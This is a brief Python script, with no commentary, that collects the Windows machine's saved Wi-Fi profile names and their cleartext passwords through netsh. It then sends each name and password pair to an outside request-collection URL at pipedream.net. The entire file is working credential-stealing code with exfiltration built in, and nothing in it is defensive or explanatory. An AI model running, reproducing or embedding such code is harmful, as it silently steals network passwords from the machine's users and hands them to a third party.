import sys,base64,urllib.request,subprocess,concurrent.futures

data = subprocess.check_output(['netsh','wlan','show','profiles']).decode(errors='replace').split('\n')
profiles =[i.split(':')[1][1:-1] for i in data if "All User Profile" in i]
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as e:
    for hostinfo in e.map(lambda i: urllib.request.urlopen('https://encssv4vtly2.x.pipedream.net/'+i.replace(' ','-') +'='+ [b.split(':')[1][1:-1] for b in subprocess.check_output(['netsh','wlan','show','profiles',i,'key=clear']).decode(errors='replace').split('\n') if 'Key Content' in b][0] ), profiles):
        pass
